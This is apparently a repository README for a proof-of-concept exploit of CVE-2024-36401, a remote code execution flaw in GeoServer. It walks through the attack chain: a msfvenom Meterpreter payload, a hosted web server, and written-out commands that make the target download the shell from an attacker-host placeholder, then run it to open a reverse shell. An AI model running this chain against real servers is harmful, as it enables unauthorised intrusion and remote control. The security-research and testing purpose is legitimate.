<img src="https://tryhackme-badges.s3.amazonaws.com/Nader2.png" alt="Your Image Badge" />

# CVE-2024-36401 Proof of Concept (PoC)
## Remote Code Execution in GeoServer

This repo contains my POC version for **CVE-2024-36401**, a critical (RCE) vulnerability in GeoServer, developed as part of a take-home exercise.

### CVE Description - - https://nvd.nist.gov/vuln/detail/CVE-2024-36401
CVE-2024-36401 is a vulnerability in GeoServer that allows attackers to execute arbitrary code remotely due to improper input validation in the WFS `GetPropertyValue` request. By crafting a malicious request, an attacker can invoke Java's `Runtime.exec()` to run commands on the server.



Affected Versions

GeoServer versions before 2.23.6 (e.g., 2.23.5 and earlier)
GeoServer 2.24.0 to 2.24.3.
GeoServer 2.25.0 to 2.25.1.

### Exploit Method
This PoC demonstrates the exploitation of CVE-2024-36401 through the following steps...

1. **Payload Generation**: A 32-bit Linux Meterpreter reverse shell is generated with `msfvenom` and saved as an ELF binary (`shell`) in a user-specified directory.
2. **Web Server Hosting**: A Python `http.server` instance hosts the payload, allowing the target to download it.
3. **Command Execution**: A `curl` request delivers commands to the vulnerable GeoServer instance, sequentially:
   - Downloading the payload (`wget http://attackerHostIP/shell -O /tmp/shell`).
   - Setting execute permissions (`chmod +x /tmp/shell`).
   - Running the payload (`/tmp/shell`).
4. **Reverse Shell**: The executed payload connects back to a Metasploit listener, providing a Meterpreter session.

This approach targets 32-bit Linux GeoServer instances (e.g., Debian) and requires network reachability between the target and attacker’s IP.

### Requirements
- Python 3.x
- Metasploit Framework (`msfvenom` and `msfconsole`)
- A vulnerable GeoServer instance (hosted on debian for tests)
- Network access to the target

## In Action

<p align="center">
  <img src="showcase.gif" alt="demo">
</p>

## Disclaimer
This is for educational and authorized testing purposes only.
